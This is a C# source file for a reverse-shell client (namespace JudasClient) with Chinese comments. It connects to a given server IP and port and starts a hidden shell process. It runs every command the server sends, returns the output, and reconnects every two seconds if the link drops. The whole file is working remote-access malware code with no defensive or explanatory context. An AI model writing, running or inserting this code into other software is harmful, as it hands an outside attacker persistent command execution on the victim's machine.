using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
namespace JudasClient;

public class ReverseShellClient
{
    public static void Start(string serverIp, int serverPort, string shell)
    {
        TcpClient client;

        while (true) // 外部循环，用于在连接断开时重新连接
        {
            try
            {
                // 尝试连接到服务端
                client = new TcpClient(serverIp, serverPort);
                Console.WriteLine("连接成功！");
                // 在连接成功后，你可以在这里执行其他操作
                // 例如发送或接收数据

                // 获取网络流
                NetworkStream stream = client.GetStream();
                StreamReader reader = new StreamReader(stream);
                StreamWriter writer = new StreamWriter(stream);

                // 创建并启动 cmd 进程
                Process cmdProcess = new Process();
                cmdProcess.StartInfo.FileName = shell;
                cmdProcess.StartInfo.RedirectStandardOutput = true;
                cmdProcess.StartInfo.RedirectStandardInput = true;
                cmdProcess.StartInfo.UseShellExecute = false;
                cmdProcess.StartInfo.CreateNoWindow = true;
                cmdProcess.Start();

                // 获取 cmd 进程的输入流和输出流
                StreamWriter cmdInput = cmdProcess.StandardInput;
                StreamReader cmdOutput = cmdProcess.StandardOutput;

                while (client.Connected) // 内部循环，只有在连接正常时才执行
                {
                    // 读取服务端发送的命令
                    string command = reader.ReadLine();

                    // 发送命令给 cmd 进程
                    cmdInput.WriteLine(command);
                    cmdInput.WriteLine("echo end"); // 添加标记以便在输出中定位结束

                    // 读取 cmd 进程的输出并发送给服务端
                    StringBuilder output = new StringBuilder();
                    string line;
                    while ((line = cmdOutput.ReadLine()) != "end")
                    {
                        output.AppendLine(line);
                    }

                    // 发送输出给服务端
                    writer.WriteLine(output);
                    writer.Flush();
                }
            }
            catch (SocketException)
            {
                // 如果连接失败，等待一段时间后重试
                Console.WriteLine("连接失败，正在重试...");
                Thread.Sleep(2000); // 等待2秒钟后重试
            }
            catch (IOException)
            {
                // 如果发生 IO 异常，表示连接已断开
                Console.WriteLine("连接断开，正在尝试重新连接...");
            }
        }
    }
}
